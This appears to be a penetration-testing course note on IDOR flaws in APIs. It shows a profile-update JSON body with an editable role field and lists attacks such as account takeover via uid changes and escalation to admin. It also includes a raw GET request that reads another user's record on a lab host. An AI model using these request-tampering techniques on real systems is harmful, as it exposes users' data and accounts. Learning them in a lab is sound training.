---
title: e-IDOR in Insecure APIs
draft: false
tags:
  - idor
---
So far, we have only been using IDOR vulnerabilities to access files and resources that are out of our user's access. However, IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users.

`IDOR Insecure Function Calls` enable us to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information.

## Identify Insecure APIs

When we click on the `Edit Profile` button, we are taken to a page to edit information of our user profile, namely `Full Name`, `Email`, and `About Me`.

We see that the page is sending a `PUT` request to the `/profile/api.php/profile/1` API endpoint.

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Via changing the `role` above, we should be able to set an arbitrary role for our user, which may grant us more privileges. 

But how do we know what other roles exist?

## Exploit Insecure APIs

There are a few things we could try in this case:

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

Let's say all the above failed. Does this mean this web app is secure against IDOR attacks?

So far, we have only been testing the `IDOR Insecure Function Calls`. However, we have not tested the API's `GET` request for `IDOR Information Disclosure Vulnerabilities`. If there was no robust access control system in place, we might be able to read other users' details, which may help us with the previous attacks we attempted.

Changing the request method to `GET` from `POST`, we are able to get information for `uid=5`:

```
GET /profile/api.php/profile/5 HTTP/1.1
Host: 83.136.254.113:42013
Content-Length: 208
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-type: application/json
Accept: */*
Origin: http://83.136.254.113:42013
Referer: http://83.136.254.113:42013/profile/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: role=employee
Connection: keep-alive

{"uid":5,"uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"employee","full_name":"Amy Lindon","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}
```